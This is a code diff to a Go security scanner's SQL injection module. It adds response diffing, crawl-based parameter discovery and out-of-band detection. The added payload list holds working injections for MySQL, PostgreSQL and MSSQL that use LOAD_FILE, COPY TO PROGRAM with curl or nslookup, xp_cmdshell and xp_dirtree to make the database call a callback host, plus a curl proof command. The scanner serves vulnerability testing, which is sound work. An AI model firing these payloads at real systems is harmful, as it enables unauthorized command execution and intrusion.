@@ -26,6 +26,8 @@ import (
 	"github.com/stormbane-security/beacon/internal/postexploit"
 	"github.com/stormbane-security/beacon/internal/scan"
 	"github.com/stormbane-security/beacon/internal/scanner/authctx"
+	"github.com/stormbane-security/beacon/internal/scanner/diffing"
+	"github.com/stormbane-security/beacon/internal/scanner/paramdiscovery"
 )
 
 
@@ -209,9 +211,12 @@ func probeErrorBased(ctx context.Context, client *http.Client, scheme, asset, pa
 
 		// Boolean-based: if the tautology payload produces a significantly
 		// different response compared to the baseline, that's suspicious.
+		// Uses response diffing with dynamic content stripping (timestamps,
+		// CSRF tokens, session IDs) for more accurate detection than simple
+		// body length comparison.
 		if ep.name == "boolean-tautology" && baselineBody != "" && body != "" {
-			diff := bodyLengthDiff(baselineBody, body)
-			if diff > 0.3 { // >30% body length change
+			similarity := diffing.Compare([]byte(baselineBody), []byte(body))
+			if diffing.SignificantDiff([]byte(baselineBody), []byte(body), 0.7) {
 				return &finding.Finding{
 					CheckID:    finding.CheckWebSQLi,
 					Module:     "deep",
@@ -220,9 +225,9 @@ func probeErrorBased(ctx context.Context, client *http.Client, scheme, asset, pa
 					Confidence: finding.ConfidenceProbable,
 					Title:      fmt.Sprintf("Boolean-based SQL injection in %s parameter at %s", param, path),
 					Description: fmt.Sprintf(
-						"Response body changed significantly (%.0f%% size difference) when injecting boolean tautology %q. "+
-							"Baseline length: %d, injected length: %d.",
-						diff*100, ep.value, len(baselineBody), len(body)),
+						"Response body changed significantly (similarity %.2f after stripping dynamic content) "+
+							"when injecting boolean tautology %q. Baseline length: %d, injected length: %d.",
+						similarity, ep.value, len(baselineBody), len(body)),
 					Asset:    asset,
 					DeepOnly: true,
 					Evidence: map[string]any{
@@ -232,7 +237,7 @@ func probeErrorBased(ctx context.Context, client *http.Client, scheme, asset, pa
 						"payload":         ep.name,
 						"baseline_length": len(baselineBody),
 						"injected_length": len(body),
-						"diff_ratio":      diff,
+						"similarity":      similarity,
 					},
 					ProofCommand: fmt.Sprintf(
 						`diff <(curl -sk '%s') <(curl -sk '%s')`,
@@ -315,9 +320,17 @@ func (s *Scanner) Run(ctx context.Context, asset string, scanType module.ScanTyp
 		return nil, nil
 	}
 
+	// Merge discovered parameters from crawl results into the hardcoded probe
+	// list. This allows the scanner to test parameters that actually exist on
+	// the target rather than relying solely on generic wordlists.
+	effectiveProbePaths := probePaths
+	if discovered := paramdiscovery.DiscoveredParamsFromContext(ctx); len(discovered) > 0 {
+		effectiveProbePaths = mergeDiscoveredParams(probePaths, discovered)
+	}
+
 	var findings []finding.Finding
 
-	for _, pp := range probePaths {
+	for _, pp := range effectiveProbePaths {
 		if ctx.Err() != nil {
 			break
 		}
@@ -448,18 +461,32 @@ func (s *Scanner) Run(ctx context.Context, asset string, scanType module.ScanTyp
 				break
 			}
 
-			// Try OOB-based detection if available
+			// Try OOB-based detection if available — uses both DNS and HTTP
+			// callbacks for maximum coverage across database types.
 			if oobSrv := oob.FromContext(ctx); oobSrv != nil {
-				token := oobSrv.GenerateToken(fmt.Sprintf("sqli-%s-%s", pp.path, param))
-				oobDomain := oobSrv.DNSHostname(token)
+				token := oob.MakeToken(oobSrv, "sqli", asset, fmt.Sprintf("oob-%s-%s", pp.path, param))
+				oobDomain := oob.PayloadDNS(oobSrv, token)
+				oobURL := oob.PayloadURL(oobSrv, token)
 
 				oobPayloads := []string{
+					// MySQL: UNC path for DNS exfil
 					fmt.Sprintf("' AND 1=LOAD_FILE('\\\\\\\\%s\\\\a')-- -", oobDomain),
+					// MySQL: HTTP-based (limited, but works on some configs)
+					fmt.Sprintf("' AND 1=LOAD_FILE('%s')-- -", oobURL),
+					// PostgreSQL: COPY ... FROM PROGRAM with curl
+					fmt.Sprintf("'; COPY (SELECT '') TO PROGRAM 'curl %s'-- -", oobURL),
+					// PostgreSQL: DNS via nslookup
 					fmt.Sprintf("'; COPY (SELECT '') TO PROGRAM 'nslookup %s'-- -", oobDomain),
+					// MSSQL: xp_cmdshell with curl
+					fmt.Sprintf("'; EXEC xp_cmdshell 'curl %s'-- -", oobURL),
+					// MSSQL: xp_dirtree for UNC path
 					fmt.Sprintf("'; EXEC master..xp_dirtree '\\\\\\\\%s\\\\a'-- -", oobDomain),
 				}
 
 				for _, op := range oobPayloads {
+					if ctx.Err() != nil {
+						break
+					}
 					testURL := fmt.Sprintf("%s://%s%s?%s=%s", scheme, asset, pp.path, param, url.QueryEscape(op))
 					_, _ = timeRequest(ctx, client, testURL)
 				}
@@ -467,23 +494,32 @@ func (s *Scanner) Run(ctx context.Context, asset string, scanType module.ScanTyp
 				// Check for OOB callback (brief wait)
 				if cb, ok := oobSrv.WaitForCallback(ctx, token, 5*time.Second); ok {
 					findings = append(findings, finding.Finding{
-						CheckID:  finding.CheckWebSQLi,
-						Module:   "deep",
-						Scanner:  scannerName,
-						Severity: finding.SeverityCritical,
-						Title:    fmt.Sprintf("OOB SQL injection confirmed in %s at %s", param, pp.path),
+						CheckID:    finding.CheckWebSQLi,
+						Module:     "deep",
+						Scanner:    scannerName,
+						Severity:   finding.SeverityCritical,
+						Confidence: finding.ConfidenceVerified,
+						Title:      fmt.Sprintf("OOB SQL injection confirmed in %s at %s", param, pp.path),
 						Description: fmt.Sprintf(
-							"Out-of-band DNS callback received from %s, confirming SQL injection. "+
-								"Protocol: %s", cb.RemoteAddr, cb.Protocol),
+							"Out-of-band callback received from %s, confirming SQL injection. "+
+								"The database executed a network request to the OOB server via %s. "+
+								"This confirms the application is vulnerable to SQL injection with "+
+								"the ability to make outbound network connections.",
+							cb.RemoteAddr, cb.Protocol),
 						Asset:    asset,
 						DeepOnly: true,
 						Evidence: map[string]any{
+							"method":      "oob",
 							"path":        pp.path,
 							"parameter":   param,
 							"oob_token":   token,
 							"callback_ip": cb.RemoteAddr,
 							"protocol":    cb.Protocol,
 						},
+						ProofCommand: fmt.Sprintf(
+							`curl -sk '%s://%s%s?%s=%s'`,
+							scheme, asset, pp.path, param,
+							url.QueryEscape(fmt.Sprintf("'; COPY (SELECT '') TO PROGRAM 'curl %s'-- -", oobURL))),
 						DiscoveredAt: time.Now(),
 					})
 				}
@@ -577,4 +613,40 @@ func detectScheme(ctx context.Context, client *http.Client, asset string) string
 		return scheme
 	}
 	return ""
+}
+
+// mergeDiscoveredParams combines hardcoded probe paths with parameters
+// discovered from crawl results. For paths already in the hardcoded list,
+// any newly discovered params are appended. For paths only in the discovered
+// set, a new entry is created.
+func mergeDiscoveredParams(hardcoded []struct{ path string; params []string }, discovered map[string][]string) []struct{ path string; params []string } {
+	// Copy hardcoded entries and build a path→index lookup.
+	result := make([]struct{ path string; params []string }, len(hardcoded))
+	pathIdx := make(map[string]int, len(hardcoded))
+	for i, pp := range hardcoded {
+		params := make([]string, len(pp.params))
+		copy(params, pp.params)
+		result[i] = struct{ path string; params []string }{path: pp.path, params: params}
+		pathIdx[pp.path] = i
+	}
+
+	for path, newParams := range discovered {
+		if idx, ok := pathIdx[path]; ok {
+			// Merge into existing entry — deduplicate.
+			existing := make(map[string]bool, len(result[idx].params))
+			for _, p := range result[idx].params {
+				existing[p] = true
+			}
+			for _, p := range newParams {
+				if !existing[p] {
+					result[idx].params = append(result[idx].params, p)
+					existing[p] = true
+				}
+			}
+		} else {
+			// New path from crawl results.
+			result = append(result, struct{ path string; params []string }{path: path, params: newParams})
+		}
+	}
+	return result
 }
